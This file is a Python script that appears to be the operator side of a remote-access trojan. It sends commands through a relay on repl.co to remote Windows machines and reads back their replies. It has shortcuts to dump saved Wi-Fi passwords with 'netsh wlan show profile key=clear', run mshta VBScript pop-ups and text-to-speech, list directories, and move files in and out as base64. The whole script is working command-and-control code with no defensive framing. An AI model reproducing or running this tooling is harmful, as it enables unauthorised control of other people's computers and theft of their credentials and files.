import requests as req
import threading
from time import sleep
import base64

kesendata = {"nm": "nul"}

def gelenebak():
    while True:
        gelen = req.get("https://dosyaci.zgretin.repl.co/musallat")
        if gelen.text != "nul":
            print(f"---{gelen.text}")
            req.post("https://dosyaci.zgretin.repl.co/musallat", data=kesendata) 
        else:
            sleep(0.3)


def dosyaat(path):
    with open(path, "rb") as f:
        filedata = f.read()
    filedata = base64.b64encode(filedata).decode("utf-8")
    print(filedata)
    req.post("https://dosyaci.zgretin.repl.co/dosyagelen", data={"nm":filedata}, verify=False)


a_thread = threading.Thread(target = gelenebak)
a_thread.start()

while True:
    i = input("gidecekbilgi: ")

    if i.startswith("dos:"):
        i = i.replace("dos:", "")
        i = i.split(".")
        dosyabayt = req.get("https://dosyaci.zgretin.repl.co/dosyagelen")
        by = dosyabayt.text
        byt = base64.b64decode(by.encode('utf-8'))
        print(byt)
        with open(f"{i[0]}.{i[1]}", "wb")as f:
            f.write(byt)
        print("oldu")

    elif i == 'dir':
        i = "kmt:dir"

    elif i.startswith("msg:"):
        isim = str(i.split("msg:", 1)[0])
        yazı = str(i.split(":", 1)[1])
        yazı = f'kmt:mshta vbscript:Execute("alert ""{yazı}"", vbOkOnly, ""sa""")(window.close)'
        i = isim + yazı
        print(i)


    elif i.startswith("ses:"):
        isim = str(i.split("ses:", 1)[0])
        yazı = str(i.split("ses:", 1)[1])
        yazı = f'kmt:mshta vbscript:createobject("sapi.spvoice").speak("{yazı}")(window.close)'
        i = isim + yazı
        print(i)
        
    elif i.startswith("int:"):
        i = i.replace("int:", "kmt:netsh wlan show profiles")
        
    elif i.startswith("pass:"):
        i = i.replace("pass:", "kmt:netsh wlan show profile ")
        i = i + ' key=clear'

    elif "dosyaal:" in i:
        path = str(i.split(":", 1)[1])
        print(path)
        path = path.split(",,,", 1)
        print(path)
        path1 = str(path[0])
        path2 = str(path[1])
        dosyaat(path1)
        print("attım.")


    data = {"nm": i}
    r = req.post("https://dosyaci.zgretin.repl.co/gidecekbilgi", data=data)
    
